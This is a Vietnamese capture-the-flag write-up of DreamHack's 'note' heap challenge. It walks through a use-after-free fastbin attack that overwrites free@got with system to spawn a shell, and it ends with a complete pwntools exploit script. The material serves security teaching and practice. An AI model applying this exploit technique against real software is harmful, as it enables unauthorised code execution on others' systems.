# note---Write-up-----DreamHack
Hướng dẫn cách giải bài note cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 04/10/2026

## 1. Mục tiêu
Đầu tiên là đọc code

```C
unsigned __int64 create()
{
  unsigned int v0; // ebx
  unsigned int v2; // [rsp+Ch] [rbp-24h] BYREF
  size_t nmemb; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%d", &v2);
  if ( v2 >= 10 )
    exit(1);
  printf("size: ");
  __isoc99_scanf("%lu", &nmemb);
  if ( nmemb > 112 )
    exit(1);
  *((_QWORD *)&unk_4040A8 + 2 * (int)v2) = nmemb;
  v0 = v2;
  *((_QWORD *)&unk_4040B0 + 2 * (int)v0) = calloc(nmemb, 1uLL);        // calloc() thay vì malloc()
  if ( !*((_QWORD *)&unk_4040B0 + 2 * (int)v2) )
    exit(1);
  printf("data: ");
  read(0, *((void **)&unk_4040B0 + 2 * (int)v2), nmemb);
  return v4 - __readfsqword(0x28u);
}
```

```C
unsigned __int64 sub_40127A()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0xA )
    exit(1);
  if ( !*((_QWORD *)&unk_4040B0 + 2 * (int)v1) )
    exit(1);
  free(*((void **)&unk_4040B0 + 2 * (int)v1));      // UAF
  return v2 - __readfsqword(0x28u);
}
```

Và xem các lớp phòng thủ

<img width="368" height="120" alt="image" src="https://github.com/user-attachments/assets/3ef37322-4359-442a-8d7a-1af5402a11d5" />

Quái lạ, 1 bài Heap mà lại **NO PIE** + **Partial RELRO**. Có lẽ tác giả có ý chăng.

Từ các dữ kiện trên, ta rút ra được kết luận là bài này là 1 bài **Fastbin Attack**. Nói sơ qua `calloc()` thì nó sẽ khởi tạo chunk full byte null nhưng có 1 đặc điểm là nó sẽ không lấy chunk từ `tcache` mà 1 là tự tạo chunk mới 2 là rút ra từ `fastbin, unsortbin, largebin`. Mình biết bài này là **Fastbin Attack** là vì nó chỉ cho tạo size tối đa 112 byte.

Cách khai thác của **Fastbin Attack** là mình sẽ sửa con trỏ `fd` của chunk A trỏ đến chunk B thành trỏ đến 1 vị trí mình kiểm soát được. Nhưng khác với `tcache` có thể trỏ bất cứ đâu miễn là phải **Alligment 16 byte**. Thì cái này bắt buộc phải trỏ đến `vị trí + 8` na ná với size của `fastbin`. À nhớ xor nữa nha tại có **Safe Linking**

<img width="1263" height="93" alt="image" src="https://github.com/user-attachments/assets/bd310ec9-bc4c-4203-b88a-1625b940fa56" />

Ví dụ mình có `fastbin` là 0x70 thì mình phải trỏ đến nơi có giá trị là 0x7X gì đó, miễn sao có đầu là 0x7 là được. Ok nhiêu đây là đủ thông tin để khai thác rồi, bắt tay vô làm thôi !

## 2. Cách thực hiện
Đầu tiên là mình sẽ lấp đầy `tcache` bằng thằng em của mình 🐧. Tiện thể thì mình sẽ tạo 2 chunk A B trong `fastbin` và leak heap luôn.

```Python
for i in range(7):
    create(i, 0x60, b'A' * 8)

for i in range(7):
    delete(i)

create(7, 100, b'B' * 8)
create(8, 100, b'C' * 8)
delete(8)
delete(7)

view(8)
p.recvuntil(b'data: ')
leak_heap = u64(p.recv(3) + b'\x00\x00\x00\x00\x00')            # local
# leak_heap = u64(p.recv(2) + b'\x00\x00\x00\x00\x00\x00')      # remote
heap = leak_heap << 12
log.success(f'Heap base : {hex(heap)}')
```

Ok, sau khi làm xong thì mình sẽ tìm 1 vị trí có giá trị là 0x7X để ghi vào. Mình suy nghĩ tới việc ghi vào `note[]` luôn. Bởi vì mọi thao tác `view`, `update` đều thông qua thao tác con trỏ của `note[]`.

<img width="671" height="460" alt="image" src="https://github.com/user-attachments/assets/7e8faa4b-b5be-408f-ba58-d5505bab5773" />

Không có 0x7X ? Không vấn đề, mình sẽ tự tạo bằng cách tạo thêm 1 `note` mới. Và sau khi tạo note mới mình sẽ trỏ vào đó.

```Python
target = 0x404130   
edit(7, p64(target ^ (heap >> 12)))

create(7, 100, b'A' * 8)
create(9, 0x70, b'A' * 8)
create(8, 100, p64(0x404018))
```

<img width="1180" height="553" alt="image" src="https://github.com/user-attachments/assets/4ac58d34-96d6-4593-91ab-b566e70a7bfb" />

Vậy là tại `note[9]` mình đã sửa thành công con trỏ để nó trỏ đến `free@got` rồi. Từ đây ta có thể leak libc và sửa `free@got` thành `system`.

```Python
view(9)
p.recvuntil(b'data: ')
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc.address = leak_libc - 0xa53e0
log.success(f'Libc base : {hex(libc.address)}')

edit(9, p64(libc.symbols['system']))
```

Sau khi sửa xong `free@got` thành `system` thì ta sẽ sử dụng lỗi **Use After Free** để sửa `note[0]` thành `/bin/sh` và tận dụng luôn lỗi **Double Free**.

```Python
edit(0, b'/bin/sh\x00' + p64(0))
delete(0)
```

<img width="1580" height="755" alt="image" src="https://github.com/user-attachments/assets/35443f9c-ac18-4cc3-a372-06c845232af1" />

Vậy là xong 1 bài **Fastbin Attack** cơ bản. Khá là dễ đúng không 🐧.

## 3. Exploit
```Python
from pwn import *

exe = ELF("note_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process('./note_patched')
# p = remote('host3.dreamhack.games', 19680)

def create(idx, size, payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', payload)

def view(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def edit(idx, payload):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendafter(b'data: ', payload)

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx).encode())

for i in range(7):
    create(i, 0x60, b'A' * 8)

for i in range(7):
    delete(i)

create(7, 100, b'B' * 8)
create(8, 100, b'C' * 8)
delete(8)
delete(7)

view(8)
p.recvuntil(b'data: ')
leak_heap = u64(p.recv(3) + b'\x00\x00\x00\x00\x00')            # local
# leak_heap = u64(p.recv(2) + b'\x00\x00\x00\x00\x00\x00')      # remote
heap = leak_heap << 12
log.success(f'Heap base : {hex(heap)}')

target = 0x404130   
edit(7, p64(target ^ (heap >> 12)))

create(7, 100, b'A' * 8)
create(9, 0x70, b'A' * 8)
create(8, 100, p64(0x404018))

view(9)
p.recvuntil(b'data: ')
leak_libc = u64(p.recv(6) + b'\x00\x00')
libc.address = leak_libc - 0xa53e0
log.success(f'Libc base : {hex(libc.address)}')

edit(9, p64(libc.symbols['system']))
edit(0, b'/bin/sh\x00' + p64(0))
delete(0)

p.interactive()
```
